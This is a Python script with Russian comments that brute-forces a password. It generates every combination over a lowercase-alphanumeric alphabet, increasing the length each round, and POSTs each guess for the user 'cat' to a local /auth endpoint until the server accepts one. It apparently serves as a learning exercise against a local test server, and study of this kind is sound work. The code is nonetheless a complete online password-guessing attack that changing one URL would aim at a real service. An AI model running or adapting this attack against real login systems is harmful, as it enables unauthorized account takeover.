import requests

alphabet = '0123456789qwertyuiopasdfghjklzxcvbnm'


length = 0              # Мощность алфавита (кол-во разрядов)
state = 0               # Счётчик сгенерированных паролей с постоянным кол-вом разрядов
base = len(alphabet)    # Кол-во используемых в пароле символов

while True:
    password = ''
    temp_state = state                      # Локальный счётчик
    while temp_state > 0:
        ceil = temp_state // base           # Уменьшение числа на разряд
        rest = temp_state % base            # Индекс символа, который будет добавлен

        # Новый символ добавляется слева к паролю
        password = alphabet[rest] + password

        # Строка предотвращает "зацикливание" программы и уменьшает число на разряд
        temp_state = ceil

    # Приписываем ноль в левой части генерируемого пароля
    password = alphabet[0] * (length - len(password)) + password
    print(state, password)
    response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'cat', 'password': password})

    if response.status_code == 200:
        print('Succes', 'cat', password)
        break

    # Номер комбинации в разряде length
    state += 1

    # Условие для начала нового перебора символов с большим кол-вом разрядов
    # При первом проходе пароль обнуляется и разряд пароля увеличивается
    if password == alphabet[-1] * length:
        length += 1
        state = 0
        print('\n Добавляем '+ str(length) +' разряд!')
